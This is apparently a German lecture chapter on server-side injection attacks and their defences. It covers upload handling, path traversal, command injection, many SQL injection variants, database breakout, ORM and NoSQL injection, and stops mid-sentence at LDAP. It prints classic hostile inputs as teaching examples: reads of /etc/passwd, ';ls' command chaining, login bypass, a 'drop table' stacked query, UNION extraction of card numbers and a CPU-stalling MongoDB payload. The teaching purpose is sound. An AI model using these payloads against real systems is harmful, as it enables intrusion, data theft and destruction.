# Serverseitige Angriffe

Ein Grundsatz der Programmierung ist *Garbage-In, Garbage-Out*. In
Anlehnung an FIFO (*First-In, First-Out*) wird damit ausgedrückt, dass
durch “schlechte” Benutzereingaben undefiniertes Verhalten produziert
wird. Während dies ursprünglich funktional gedacht war, ist diese
Aussage auch für die Sicherheit einer Applikation relevant.

Benutzern kann nicht getraut werden. Während gutartige Benutzer
bestenfalls wirre Eingaben erstellen, werden durch bösartige Benutzer
Eingaben durchgeführt, die gezielt die Sicherheit eines Systems
kompromittieren sollten. Das Grundmuster ist, dass eine Benutzereingabe
als Kommando interpretiert wird. Dies wird durch Angreifer ausgenutzt
um, von der Applikation ungewollte, Kommandos abzusetzen. Diese
Kommandos werden dann mit den Rechten der Webapplikation (oder eines
weiteren Hintergrundsystems) ausgeführt.

Ein Problem ist die große Angriffsfläche da nicht nur die direkt
Eingabe-verarbeitenden Stellen überprüft werden müssen, sondern alle
Programmteile die potentiell Benutzereingaben indirekt erhalten können
(z.B. Daten aus deiner Datenbank auslesen, die ursprünglich von einem
Benutzer bereitgestellt wurden). Ebenso muss ein Ausbruch nicht direkt
am angegriffenen System erfolgen, sondern kann auch auf
Hintergrundsystemen passieren. Beispielsweise kann ein Angreifer eine
Webapplikation angreifen, bricht aber erst auf Datenbankebene aus dem
System aus (auf einem getrennten Datenkbankserver).

Da Tests auf Injection-Angriffe meist gegen bestimmte Operationen und
bestimmte Hintergrundsysteme gerichtet sind (z.B. gegen eine MSSQL
Datenbank) werden zumeist dutzende oder hunderte Angriffsmuster
durchprobiert. Aus Effizienzgründen wird hier sehr stark auf
automatisierte Tools gesetzt.

Der Verteidigungsgrundsatz ist es, niemals Benutzerdaten zu vertrauen.
Alle Benutzereingaben müssen auf Schadmuster hin überprüft werden, falls
Schadcode entdeckt wird, muss die Eingabe verworfen oder gecleaned
werden. Aufgrund der vielen verschiedenen Angriffsmuster ist dies nur
mittels Bibliotheken sinnvoll möglich. Benutzereingaben dürfen niemals
direkt zur Erstellung dynamischer Operationen verwendet werden. Die
meisten Frameworks bieten dezidierte Möglichkeiten um Benutzereingaben
in Operationen zu inkludieren (z.B. *prepared statements*), bei diesen
wird automatisch eine Filterung von Schadcode durchgeführt. Und
schlussendlich sollten alle Benutzerausgaben noch bereinigt bzw.
maskiert werden bevor sie wieder angezeigt werden. Dadurch wird
verhindert, dass Operationen im Kontext eines anderen Benutzers
ausgeführt werden.

Als zusätzliche Hardening-Maßnahme können Sandboxing-Konzepte, optionale
HTTP Security-Header und IDS/IPS-Systeme verwendet werden.

## File Uploads

Wenn ein Benutzer bei einer Webseite Dateien hochladen und der idente
Benutzer (oder ein anderer Benutzer) danach wieder auf diese Dateien
zugreifen kann, ergeben sich zwei Gefährdungsmomente. Einerseits kann
der idente Benutzer versuchen, mit dem hochgeladenen File den Server
direkt anzugreifen (z.B. um Code am Server auszuführen), auf der anderen
Seite kann ein Angreifer versuchen, auf diese Weise einen anderen
Benutzer anzugreifen (z.B. um dessen Session zu übernehmen).

### Das Upload-Verzeichnis

In einer sicherheitstechnisch guten Webapplikation sind alle Dateien und
Verzeichnisse schreibgeschützt — Angriffe, die serverseitig Dateien
erstellen oder modifizieren müssen, werden dadurch erschwert. Die
einzige Ausnahme sollte das Upload-Verzeichnis sein in welches die
Webapplikation (bzw. der Systemuser der Webapplikation) schreibend
zugreifen darf.

Dieses Verzeichnis sollte niemals unterhalb des Webroots liegen, falls
z.B. der Webroot <a href="/var/www/html" class="uri">/var/www/html</a>
ist, sollte das Uploadsvereichnis sich nicht unter
<a href="/var/www/html/uploads" class="uri">/var/www/html/uploads</a>
befinden. Würde das Verzeichnis so situiert sein, kann der Webserver bei
einem Zugriff auf ein hochgeladenes File schwer unterscheiden, ob eine
hochgeladene Datei zum “normalen” Umfang der Webapplikation gehört, oder
ob es sich um eingeschleusten Schadcode handelt. Zusätzlich sollten
Directory-Listings für dieses Verzeichnis deaktiviert werden und das
Verzeichnis auf einer Partition mit aktivierter *noexec* Mount-Option
(bei Verwendung von Linux) platziert werden.

Der Dateiname, unter dem ein hochgeladenes File abgelegt wird, sollte
niemals durch den User bestimmt werden. Dies würde path traversal
Angriffe erlauben[1] bzw. könnte ein Angreifer den bekannten Pfad zu
einem File im Zuge von weiteren Injection-Angriffen verwenden.

Ein architekturelles Problem ist durch die Struktur von Webapplikationen
bedingt. Eine deployte Webapplikation besteht meistens aus einem
Webserver und einem Applikationsserver. Ersterer ist für die Zustellung
statischer Dateien optimiert, letzterer beinhaltet die Applikationslogik
inkl. der Zugriffskontrollen. Werden Dateien direkt über ein
Upload-Verzeichnis bereitgestellt, übernimmt diese Aufgabe der Webserver
(der für diese statische Zustellung optimiert ist) und nicht der
Applikationsserver — in diesem Fall kann es passieren, dass die
Authentication und Authorization nicht überprüft wird. Um dies zu
vermeiden, sollte ein Download immer mittels einer dezidierten
Downloadoperation, z.B. mittels
<https://example.local/download?file_id=xxx>, durchgeführt, und auf
diese Weise durch den Applikationsserver ausgeführt werden. Dabei
sollten serverseitig die benötigten Zugriffsrechte überprüft werden, als
Id wird die Verwendung einer zufälligen ID wie z.B. einer UUID
empfohlen.

### Upload von Malicious Files

Ein einfacher Angriff ist der der Upload von Dateien, die Code zur
serverseitigen Ausführung beinhalten — z.B. das Hochladen von einer
*.php* Datei bei Verwendung einer PHP Webapplikation. Der Angreifer
würde nach dem Upload auf die Datei zugreifen und dadurch den Code am
Server zur Ausführung bringen. Bei einem File-Upload sollten daher die
möglichen Dateitypen durch eine Whitelist auf Dateitypen, die nicht am
Server exekutiert werden, beschränkt werden. Ebenso sollte mittels dem
*Content Disposition* HTTP Header dem Browser mitgeteilt werden, dass
eine bezogene Datei explizit heruntergeladen sollte (und nicht als Teil
der Webapplikation ausgeführt werden sollte).

Eine weitere Empfehlung ist die Verwendung eines server-seitigen
Virenscanners. Diese arbeiten zumeist auf Dateisystem-Basis — wird ein
File mit bösartigem Code hochgeladen, wird dieses gescannt und
gegebenenfalls unter Quarantäne gestellt bzw. gelöscht. Da die
Webapplikation dies nicht automatisch bemerkt, kann es dabei zu
Inkonsistenzen zwischen dem Dateisystem und verlinkten Dateien in der
Webapplikation kommen. Eine saubere, aber aufwendige, Lösung wäre die
Integration des Virenscanners in den Upload-Prozess der Webapplikation
(z.B. über ein API des Virenscanners). Ein workaround wäre es, falls der
Virenscanner beim Löschen einer Datei eine gleichnamige Datei mit einem
Löschhinweis hinterlegt. Auf diese Werden werden die toten Dateilinks
innerhalb der Applikation vermieden.

Besondere Beachtung sollte der Upload von gepackten Dateien (*zip*,
*rar*) erhalten. Hier muss auf der einen Seite beachtet werden, dass
Archive entpackt und der Inhalt des Archivs ebenso analysiert wird, auf
der anderen Seite muss darauf geachtet werden, dass während des
Entpackvorgangs kein Sicherheitsfehler passiert.

Ein Spezialfall des Uploads von malicious Dateien ist der Upload von
Dateien, die bösartiten JavaScript-Code beinhalten. Da diese Angriffe
gegen andere Clients (zumeist Webbrowser) abzielen, werden diese im
Kapitel *Client-seitige Injection Angriffe* (Kapitel
<a href="#upload_js" data-reference-type="ref"
data-reference="upload_js">[upload_js]</a>) behandelt.

### Sandboxing

Falls eine Webapplikation nicht-vertrauenswürde Dateien verarbeiten
muss, muss diese Dateien aus nicht-vertrauenswürdigen Quellen (Benutzer)
analysieren. Dies ist eine notorisch gefährliche Operation und wird
selten vollkommen sicher implementiert werden können. Um das potentielle
Schadmass zu reduzieren kann Sandboxing verwendet werden. Dabei wird der
Parse-Code in einem abgeschotteten Bereich des Systems ausgeführt, im
Falle eines erfolgreichen Angriffs wird zumindest nicht das Gesamtsystem
kompromittiert.

Wird server-seitig ein Virenscanner verwendet um hochgeladene Dateien
auf Schadcode hin zu überprüfen, sollte dieser ebenso vom Rest des
Systems abgeschottet werden. In den letzten Jahren wurden vermehrt
Angriffe gegen Virenscanner festgestellt. Diese sind für Angreifer sehr
lohnende Ziele, da sie alle incoming Dateien vor gereicht bekommen und
zumeist mit administrativen Rechten ausgestattet sind.

Techniken in diesem Umfeld beinhalten chroots, Jails, Container und
Microservice-Architekturen.

## Path Traversals

Bei einem Path Traversal wird versucht, über modifizierte Parameter auf
Ressourcen außerhalb des Webroots einer Webapplikation zuzugreifen. Auf
diese Weise kann versucht werden, auf applikations-externe Ressourcen
lesend oder schreibend zuzugreifen bzw. kann versucht werden,
ausführbare Dateien am Server zu starten.

Ein Beispiel für eine potentiell angreifbare Operation wäre
<https://opfer.local/GetImage.jsp?file=diagram.jpg>. Ein Angreifer
könnte versuchen, über den Wert *./../../../../etc/passwd* für den
Parameter *file* auf eine Datei außerhalb des Webroots zuzugreifen.

Als Gegenmaßnahme sollte primär versucht werden, nicht Dateinamen als
benutzer-gesteuerten Parameter zu verwenden. Falls dies wirklich
notwendig ist, sollten die Dateinamen gegen eine rigorose Whitelist und
auf invalide Steuersignale hin (z.B. NULL-Characters und Zeilenumbrüche)
überprüft werden und vor dem Zugriff auf Ressourcen der kanonische Pfad
gebildet und verifiziert werden.

Eine weitere Sicherheitsmaßnahme wäre der Einsatz von
Sandboxing-Techniken wie eines *chroot*. Durch Anwendung des Separation
of Privileges Prinzips wird das Schadmass verkleinert: der Webserver
sollte nur auf Dateien zugreifen können die für den Webserver relevant
sind. Weitere Dateien (wie z.B. Systemdateien) sollten weder lesend noch
schreibend zugreifbar sein.

## Command Injection

Eine Command Injection zielt darauf ab, Binaries (Kommandozeilentools)
auf dem Zielserver auszuführen, zumeist wird dies über modifizierte HTTP
Operationsparameter erzielt. Beliebtes Ziel ist das Erstellen einer
shell oder reverse-shell: dies erlaubt es Angreifern, ähnlich wie
mittels SSH, mit den Rechten der Webapplikation Befehle am Server
auszuführen.

Im Zuge einer Command Injection wird ein Programm am Server ausgeführt.
Da die meisten Webapplikationen losgelöst vom zugrunde liegenden System
(z.B. Windows oder Linux) entwickelt werden, rufen diese selten direkt
Systemkommandos auf. Eine Ausnahme sind embedded Systeme bei denen die
Hardware zusammen mit der Software gebündelt geliefert wird. Gerade im
Router-/AccessPoint-Umfeld werden gerne direkt Systemkommandos über die
Weboberfläche aufgerufen. Dementsprechend ist das klassische Command
Injection Beispiel eine typische Weboperation die von Access Points
bereitgestellt wird: mittels des *ping* Kommandos soll die
Netzwerkkonnektivität zwischen dem Access Point und einem externen
Server überprüft werden.

Dies könnte mit folgendem Pseudo-Python Code implementiert werden:

    import os
    domain = user_input()
    os.system('ping ' + domain)

In der Variable *domain* wird eine Benutzereingabe gespeichert, es wird
angenommen, dass diese ein domainname ist. Ein Angreifer könnte nun z.B.
*localhost; ls* als Eingabe verwenden. Durch den übergebenen ; wird bei
Unix-Kommandos ein Kommando beendet und das nächste begonnen. Durch
diese Verkettung versucht also der Angreifer das Kommando *ls*
einzuschleusen.

Ähnliche Muster sind:

-   ;ls

-   $(ls)

-   ‘ls‘

Ein ähnliches Verhalten kann ausgenutzt werden, wenn der Verdacht
besteht, dass Dateien mittels Systembefehlen ausgegeben werden und die
auszugebende Datei über HTTP Parameter übermittelt wird.

Beispiele hierfür:

-   <a href="http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|"
    class="uri">http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|</a>

-   <http://sensitive/something.php?dir=%3Bcat%20/etc/passwd>

Um Command Injection Probleme zu umgehen wird empfohlen,
Programmierbibliotheken anstatt von Kommandozeilenaufrufen zu verwenden.
Da hierbei nun keine getrennte Shell geöffnet wird, kann an dieser
Stelle auch kein Kommando eingefügt werden.

## Datenbank-Injections

Datenbank-Injections gehören zu den selteneren, dafür aber
schwerwiegenderen, vorkommenden Sicherheitsfehlern. Das Grundproblem
ist, dass Datenbankabfragen unter Zuhilfename von Benutzereingaben
gebaut werden. Durch bösartige Benutzereingaben versuchen Angreifer nun,
das Datenbanksystem zur Freigabe zusätzlicher Daten zu bringen,
unbeabsichtigt Daten zu verändern oder sogar aus dem Datenbanksystem auf
das Betriebssystem auszubrechen.

### SQL

SQL[2] ist die bekannteste Abfragesprache für relationale Datenbanken.
Im Zuge dieser Vorlesung werden nur einfache SQL-Features benötigt. Ein
Beispiel für ein einfaches SQL Statement:

    select column1, column2 from table1, table2
    where column1 = 'xyz'
    order by column1 asc/desc
    limit 1;

In diesem Fall werden zwei Spalten *column1* und *column2* aus zwei
Tabellen *table1* und *table2* ausgelesen. Mittels der where-Klausel
wird eine Bedingung zur Filterung der Daten hinzugefügt, mittels *order
by* die Daten entweder aufsteigend oder absteigend sortiert und mittels
*limit* die Anzahl der Datensätze auf einen Datensatz limitiert.

SQL bietet die Möglichkeit die Ausgaben zweier Queries zu einer
Gesamtausgabe zu kombinieren. Hierfür wird das *UNION* Kommando
verwendet:

    select column1, column2 from table1, table2
    union all
    select column3, column4 from table3, table4;

Dies ist nur möglich, wenn beide verwendeten SQL-Queries die idente
Anzahl von Spalten zurück liefern.

### Arten von SQL-Injections

Die einfachste Form der SQL-Injection basiert darauf, dass die
Applikation eine String-Concatenation zur Erstellung des SQL-Ausdrucks
verwendet. Der Angreifer versucht einen Wert zu übergeben der, wenn er
in den SQL-String eingesetzt wird, zuerst den bestehenden SQL-Ausdruck
beendet/schließt und danach zusätzlich Code ausführt.

Als Beispiel wird hier ein Login verwendet, der über folgende HTTP
Operation durchgeführt wird:
<https://kino.local/login.php?email=ah@coretec&password=pw>. Der
Angreifer vermutet, dass die Überprüfung des Logins über eine
Datenbank-Abfrage ausgeführt wird, die z.B. in Java als String erstellt
wird:

    String query = "select * from users where email = '" +email+ "' and password = '" +password +"' limit 1;";

Die Email-Adresse und das Passwort wird als Teil der Datenbank-Abfrage
verwendet, wird ein Datensatz zurückgegeben wird der erste Datensatz
vermutlich zur Befüllung der Benutzersession verwendet. Wird kein
Datensatz zurückgegeben nimmt die Applikation an, dass der Login nicht
erfolgreich war.

Ein Angreifer würde nun z.B. folgendes Fragment als Passwort übergeben:

    1' or '1'='1

Durch diesen Ausdruck würde folgendes SQL-Kommando entstehen:

    String query = "select * from users where email = 'ah@coretec.at' and password = '1' or '1'='1' limit 1;";

Anstatt dass die Email-Adresse und das Passwort überprüft werden, wird
nun initial die Email und das Passwort überprüft. Dabei wird
wahrscheinlich als Ergebnis *false* erzeugt, damit würde prinzipiell
kein Datensatz zurückgegeben werden. Der Angreifer schafft es
allerdings, auch den Ausdruck *1=1* hinzuzufügen. Dieser ergibt immer
*true*, durch die Oder-Verknüpfung wird der Gesamtausdruck *true* und
liefert daher alle Zeilen der Tabelle als Resultat. Der Applikationscode
würde nun die erste Zeile extrahieren und mit diesem Datensatz die
Session befüllen. Der Angreifer hat auf diese Weise das Login-System
überlistet und die Identität eines anderen Benutzers angenommen.

#### Stacked Queries

Die grundsätzliche Methode an eine bestehende SQL-Abfrage zusätzliche
(ungewollte) Queries anzuhängen und dadurch Code auszuführen wird
Stacked Query genannt. Das klassische Beispiel für eine solche ist:

    '; drop table users; --

Mittels des ersten Zeichens *’* wird versucht aus dem vorgesehenen
SQL-Ausdruck auszubrechen. Das Semikolon dient zum Beenden des
eigentlichen Kommandos und der Angreifer kann ein beliebiges
SQL-Kommando anhängen — in diesem Fall ein *drop table* Kommando,
welches eine Datenbank löschen würde. Zum Schluss wird mit einem
weiteren Semikolon der eingeschleuste Befehlt beendet und durch die
beiden Bindestriche ein Kommentar eingeleitet. Auf diese Weise wird
potentiell nachfolgender SQL-Code auskommentiert.

#### UNION-based SQL-Injection

Bei UNION-basierten SQL-Angriffen wird versucht mittels des *UNION*
Kommandos ein zusätzliches *SELECT* Statement an ein bestehendes
Select-Statement anzuhängen. Häufig wird dies verwendet, wenn eine
Web-Applikation eine Tabellen-ähnliche Datenauflistung bietet.

Beispiel: eine Webapplikation stellt eine Liste von Personen als
HTML-Tabelle dar. Ein Benutzer kann diese Liste durch Eingabe einer ID
einschränken. Es wird daher angenommen, dass die Daten der dargestellten
HTML-Tabelle durch eine SQL-Abfrage der Form:

    SELECT Name, Phone, Address FROM Users WHERE Id=$id

bereitgestellt wird. Der Parameter *$id* wird durch den Benutzer
bereitgestellt. Ein Angreifer kann nun versuchen, hier eine
SQL-Injection durchzuführen. Beispielsweise könnte dafür folgendes
Fragment verwendet werden:

    1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable

Dieses Fragment wird durch die Webapplikation für *$id* eingesetzt (da
ID in diesem Fall ein Zahlenwert ist, muss, verglichen mit dem Ausbruch
aus einem String-Wert, werden hier keine Quoting-Zeichen wie ’ benötigt)
und erzeugt auf diese Weise die folgende SQL-Abfrage:

    SELECT Name, Phone, Address FROM Users WHERE Id=1
    UNION ALL
    SELECT creditCardNumber,1,1 FROM CreditCardTable

Die Tabelle wird nun initial mit den Daten des Users mit der Id 1
befüllt, zusätzlich werden alle Kreditkartennummern der Tabelle
CreditCardTable angehängt (bei diesen Daten werden Spalten 2 und 3 mit
der Konstanten 1 gefüllt).

Da bei einem UNION-Select die Spaltenanzahl der jeweiligen Queries ident
sein muss, muss der Angreifer initial die richtige Spaltenanzahl
erraten. Dies wird zumeist über Brute-Force Angriffe durchgeführt.

#### Boolean-based Blind SQL Injection

Eine SQL-Injection ist auch ohne direkten Antwortkanal möglich. Ein
Beispiel hierfür sind Boolean-based blind SQL-Injections.

Ein Beispiel: gegeben eine Produktseite
<a href="opfer.local/product/1" class="uri">opfer.local/product/1</a>
die ein Produkt anzeigt. Der Angreifer hat bereits erkannt, dass bei
Eingabe von <a href="opfer.local/product/1 and 1=1"
class="uri">opfer.local/product/1 and 1=1</a> die Produktseite ebenso
angezeigt wird und bei <a href="opfer.local/product/1 and 1=0"
class="uri">opfer.local/product/1 and 1=0</a> kein Produkt gefunden
wird. Dadurch besteht die Annahme, dass der Angreifer einen Ausdruck and
die Produkt-Id (1) anhängen kann und dass dieser Ausdruck auch
exekutiert wird (der Ausdruck 1=0 ergibt immer *false*, durch die
Und-Verknüpfung mit *false* wird kein Produkt mehr geliefert). Dies kann
nun ausgenutzt werden, um mit einzelnen Abfragen den Datenbankinhalt
auszulesen. Beispielsweise kann der Angreifer folgenden Ausdruck bilden:

    SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97

An den Suchausdruck wird also eine Substring-Abfrage hinzugefügt. Diese
extrahiert die erste Stelle des Benutzernamens, verwandelt diese über
die *ASCII*-Funktion in einen ASCII-Wert und überprüft, ob die erste
Stelle des Benutzernamens ein A ist. Wird nun die Produktseite des
Produkts 1 zurückgeliefert, weiß der Angreifer, dass das erste Zeichen
des Benutzernamens ein A ist. Wird keine Produktseite geliefert, würde
der Angreifer versuchen ob der ASCII Wert dem Zeichen B entspricht.
Durch mehrere (tausende) Anfragen kann der Angreifer auf diese Weise die
gesamte Datenbank rekonstruieren.

#### Time-based Blind SQL Injection

Ähnlich wie bei einer boolean based blind SQL-Injection gibt es bei
dieser Angriffsart keinen direkten Antwortkanal für die extrahierten
Informationen. Anstatt wird ein side-channel Angriff auf das
Zeitverhalten der Antwort angewandt.

Der Angreifer besitzt die Möglichkeit ein SQL-Fragment an eine Anfrage
anzuhängen und zur Exekution zu bringen. Wieder wird eine IF-Abfrage
verwendet, in dem konkreten Fall wird, falls die Abfrage erfolgreich
ist, die Antwort um 10 Sekunden verzögert:

    http://www.examplecom/product.php?id=10 AND IF(ASCII(SUBSTRING(username,1,1))=97, sleep(10), ‘false’))--

Als Abfrage wird der idente “fängt der Benutzername mit A an?”
verwendet. Falls dies war sein sollte wird mittels *sleep(10)* die
Antwort verzögert, wenn nicht wird sofort geantwortet. Mittels vieler
Abfragen kann der Angreifer auf diese Weise die gesamte Datenbank
extrahieren.

Im Zuge eines Time-Based Angriffs wird mehr oder weniger ein Model der
Antwortzeiten aufgebaut. Da normalerweise die eingefügte Verzögerung
minimiert wird (um möglichst schnell Daten extrahieren zu können) ist
diese Angriffsart fehlerbehaftet und verwundbar gegenüber
Netzwerk-Jitter. Falls die Netzwerkverbindung selbst instabil ist (also
Anfragen aufgrund des Netzwerks unterschiedlich lange benötigen), können
einzelne Zeichen invalid erkannt werden.

#### Error-based Injections

Bei *Error-based Injections* wird absichtlich ein Fehler eingebaut um
über den ausgegebenen Fehlertext Informationen zu extrahieren.

Ein Beispiel in MySQL: es gibt in Mysql die mathematische Funktion *exp*
welche ab einem übergebenen Dezimalwert von ca. 260 einen Fehler
ausgibt. Ebenso gibt es den Operator ‘w̃elcher ein Bitweises Kompliment
bildet. Wird dieser Operator auf das Ergebnis eines Selects angewandt,
ist das Ergebnis eine sehr große Zahl.

Ein Angreifer kann dieses Verhalten für eine Datenextraktion nutzen,
z.B.:

    exp(~(select * from (select user()) x)

Es wird also in einem sub-select die Funktion *user()* aufgerufen, die
den aktuellen Benutzernamen zurück gibt. Auf dieses Ergebnis wird ein
bitweises Kompliment angewandt, es wird eine große Zahl erzeugt; diese
Zahl wird dann an die *exp*-Funktion übergeben und wird einen Fehler
werfen.

Die generierte Fehlermeldung:

    mysql>select exp(~(select * from (select user()) x ));
    ERROR 1690(22003): DOUBLE value is out of range in'exp(~((select 'root@localhost' from dual)))'

In der Fehlermeldung wurde allerdings der innere SQL-Ausdruck
exekutiert, dadurch wird der Benutzername *root@localhost* ausgegeben
und eine Datenextraktion ist erfolgt.

Dies ist ein weiterer Grund, warum auf einer Webseite keine
detaillierten Fehlermeldungen ausgegeben werden sollten.

#### Ausbruch aus dem Datenbanksystem

Eine weitere Möglichkeit des Angreifers ist es aus dem Datenbanksystem
auf das Dateisystem auszubrechen. Dadurch kann er mit den Rechten des
Datenbankbenutzers entweder auf Dateien am Datenbankserver zugreifen
oder besitzt dadurch sogar Shell-Access auf das System. Dies ist einer
der Gründe, warum Datenbanksysteme immer mit einem eigenen Benutzer
laufen sollten.

Ein bekanntes Beispiel für dieses Problem ist die Funktion
*xp\_cmdshell* bei Microsoft SQL-Server welche die Ausführung von
Programmen über SQL erlaubt. Mittlerweile ist diese Funktion aus
Sicherheitsgründen deaktiviert, bei älteren Microsoft SQL-Server
Versionen kann allerdings diese Funktion mittels einer SQL-Injection
ebenso aktiviert werden.

Ein Beispiel aus dem Open-Source Umfeld wäre PostgreSQL, welches es
Datenbankadmins erlaubt, neue Tabellen zu erstellen und diese mit Daten
aus dem Dateisystem zu befüllen:

    postgres-# CREATE TABLE temp(t TEXT);
    postgres-# COPY temp FROM '/etc/passwd';
    postgres-# SELECT * FROM temp limit 1 offset 0;

MySQL bietet auch die beiden Zusätze *into outfile* bzw. *into dumpfile*
an. Damit wird das Resultat einer SQL-Query in eine Datei gespeichert.
Falls der Datenbankserver mit einer hohen Berechtigunggstufe läuft (z.B.
als *root* oder *www-data* Benutzer) kann dies verwendet werden um
Dateien im Filesystem (z.B. im Web-Root) abzulegen und auf diese Weise
eine Webshell hochzuladen (diese würde dann durch den Angreifer über den
Webserver geöffnet werden).

### Gegenmaßnahmen

Da das Grundproblem von SQL-Injections die Erstellung von dynamischen
SQL-Kommandos basierend auf bösartigen Benutzereingaben ist, wäre das
Escapen der Eingabe die erste mögliche Gegenmaßnahme. Dabei werden die
Benutzereingaben so maskiert, dass sie gefahrenlos per
String-Concatenation verwendet werden können. Da diese Lösung
fehleranfällig und Datenbank-spezifisch ist, sollte sie so weit wie
möglich vermieden werden.

Ein besserer Lösungsansatz für SQL-Injection ist die Verwendung von
*prepared statements*. Bei diesen wird eine SQL-Abfrage mittels einer
API gebaut (und mit Daten befüllt) anstatt “nur” Strings zu verknüpfen.
Aufgrund der zusätzlich bereitgestellten Information ist die
Datenbankbibliothek in der Lage, die benutzer-bereitgestellten Daten in
einer Form einzusetzen, welche SQL-Injections verhindert.

Ein Beispiel in Java:

    String custname = request.getParameter("customerName");
    String query = "SELECT account_balance FROM user_data WHERE user_name = ?";

    PreparedStatement pstmt = connection.prepareStatement(query);
    pstmt.setString(1, custname);

    ResultSet results = pstmt.executeQuery();

Die dynamische SQL-Query befindet sich im String *query* und beinhaltet
einen dynamischen Parameter der mit einem *?* markiert wird. Durch die
Methode *setString* wird nun der 1te Parameter auf den Wert der Variable
*custname* gesetzt und auf diese Weise die Benutzereingabe in einer
sicheren Art und Weise in die SQL-Query eingebaut.

Ein weiteres Beispiel in PHP unter Verwendung von PDOs:

    $id = 1;
    $sth = $DBH->prepare("SELECT * FROM juegos WHERE id = :id");
    $sth->bindParam(':id', $id, PDO::PARAM_INT);
    $STH->execute();

Bei diesem Beispiel werden die dynamisch inkludierten Daten mittels
eines Platzhalters (*:id*) identifiziert und mittels der Methode
*bindParam* gesetzt. Diese Art der Zuweisung hat den Vorteil, dass *:id*
innerhalb der Query an mehreren Stellen gesetzt werden kann. Ebenso wird
durch das Hinzufügen eines weiteren dynamischen Parameters die Position
der dynamischen Parameter nicht verändert[3].

Ein Problem mit prepared statements ist, dass nicht alle Elemente einer
SQL-Abfrage auf diese Weise dynamisch befüllt werden können. Häufige
Ausnahmen sind:

-   Tabellennamen

-   Spaltennamen

-   die Sortierrichtung (*ASC*, *DESC*)

Falls diese Felder befüllt werden müssen, wird empfohlen die
Applikationslogik so zu bauen, dass über die Eingabe erkannt wird,
welches Feld gewählt wurde und basierend darauf ein statischer String
zum Bauen der Query verwendet werden. Auf diese Weise wird vermieden,
dass eine Benutzereingabe direkt in den Query-String eingebaut wird.
Ebenso sollte bei einer solchen Konstruktion sowohl eine rigide
Whitelist als auch Escaping verwendet werden.

Ein Vorteil von Prepared Statements ist, dass die Absicherungslogik Teil
der Applikationslogik ist. Andere Methoden (wie z.B. Stored Procedures)
verschieben die Absicherung direkt in den Datenbankserver. Dabei besteht
das Problem, dass z.B. Anwendungsentwickler annehmen könnten, dass
gewisse Datenbank-Funktionen sicher implementiert wurden und
Datenbank-Entwickler annehmen könnten, dass Daten bereits durch die
Applikationsentwickler abgesichert wurden. Hierdurch kann es zu
Diskrepanzen bei der Absicherung kommen.

Eine weitere Gegenmaßnahme sind *Stored Procedures*. Dies sind
Funktionen die im Datenbanksystem abgelegt und von der Applikation
aufgerufen werden. Eine früher häufig genutzte Sprache zum Erstellen von
Stored Procedures ist PL/SQL, mittlerweile können Stored Procedures auch
in “normalen” Programmiersprachen entwickelt werden. Sie besitzen die
gleichen Probleme wie applikatorische Abfragen: falls eine
String-Verkettung verwendet wird, können SQL-Injections durchgeführt
werden. Stored Procedures sind aber eher auf die Verwendung von
Sprachmustern ausgelegt, die Injection-Angriffe vermeiden (ähnlich wie
Prepared Statements) und da sie meistens von Datenbank-Spezialisten
geschrieben werden, sind sie meistens sicher implementiert. Aus diesem
Grund werden Stored Procedures häufig als Gegenmaßnahme zu
SQL-Injections angeführt, auch wenn dies potentiell vom
implementierenden Programmierer abhängig ist. Ein Nachteil von Stored
Procedures ist, dass der Applikationscode dadurch auf den
Applikationsserver und den Datenbankserver aufgeteilt wird und dadurch
potentiell schwerer wartbar wird.

### Object-Relational Mapping

Object-Relational Mapping (ORM) wird verwendet um basierend auf einer
relationalen Datenbank eine virtuelle Objektdatenbank zu erstellen.
Dabei wird eine ORM-Software verwendet, um aus Datenbank-Zeilen eine
Repräsentation der Daten als Programmiersprachen-Objekt herzustellen.
Datenabfragen und -veränderungsoperationen werden anschließend auf
dieser Objekt-Repräsentation durchgeführt und intern als
Datenbankbefehle ausgeführt.

Ein häufiges Pattern in diesem Umfeld ist das ActiveRecord-Pattern. Bei
diesem entspricht eine Datenbanktabelle einem Objekttypen und eine Zeile
innerhalb der Datenbank wird zu einer Objectinstanz.B.ispielsweise würde
aus der Datenbanktabelle *users* die Klasse *User* gebildet werden. Eine
Zeile der Datenbank würde zu einer Objektinstanz und z.B. die Spalte
*vorname* würde zum Feld *vorname* des Objekts werden.

Bei den meisten ORMs werden Abfragen innerhalb der
Zielprogrammiersprache abgebildet, hier ein Beispiel in JavaScript unter
Verwendung des ORMs *sequalize*:

    models.Items.findAll({
      limit: '1',
      })

In dem Beispiel wird ein Objekt des Typs Items erstellt. Problematisch
bei ORMs ist, dass im Hintergrund zumeist SQL-Kommandos erstellt werden
und daher SQL-Injections weiterhin möglich sind, hier ein Beispiel:

    models.Items.findAll({
      limit: '1; DELETE FROM Items WHERE 1=1; --',
    })

An den Limit-Parameter wird eine Stacked-Query angehängt und auf diese
Weise eine SQL-Injection ausgeführt. Anhand diese Beispiels kann erkannt
werden, das ORMs kein Allheilmittel für SQL-Injections sind.

### NoSQL-Injections

In den letzten Jahren werden vermehrt NoSQL-Datenbanken eingesetzt.
Diese verwenden nicht SQL als Abfragesprache, sondern meistens
eigenständige Abfragesprachen oder exekutieren JavaScript-Snippets als
Query. Hier ein Beispiel in MongoDB:

    db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits < $userInput; } } );

Bei diesem Beispiel wird als Query der aktuellen Kontostand berechnet
(*credits - debits*), falls dieser unter einer benutzerdefinierten
Schranke liegt (*$userInput*) wird der behalten, ansonsten ausgefiltert.
Die Abfrage ist als JavaScript implementiert und nicht als SQL.

Die grundsätzliche Problematik einer Injection bleibt ident. In dem
gewählten Beispiel wird z.B. die Benutzereingabe nicht escaped, ein
Angreifer kann daher auf diese Weise Schadcode einfügen:

    "(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<10000); return Math.max();})()"

Hier wird nun innerhalb der Abfrage eine Javascript-Funktion definiert
und sofort danach aufgerufen. Die Funktion macht nichts anderes, als 10
Sekunden lang eine Endlosschleife aufzurufen. Falls der MongoDB-Server
nach dem Absetzen dieser Query für 10 Sekunden nicht antwortet und eine
CPU zu 100% ausgelastet ist, hat man also eine datenbankseitige
Injection erreicht.

Wie man an dem Beispiel sehen kann, ist der alleinige Einsatz von
NoSQL-Datenbanken nicht ausreichend um eine Datenbank-Injection zu
vermeiden.

## LDAP-Injections

Das Lightweight Directory Access Protocol (LDAP) ist ein
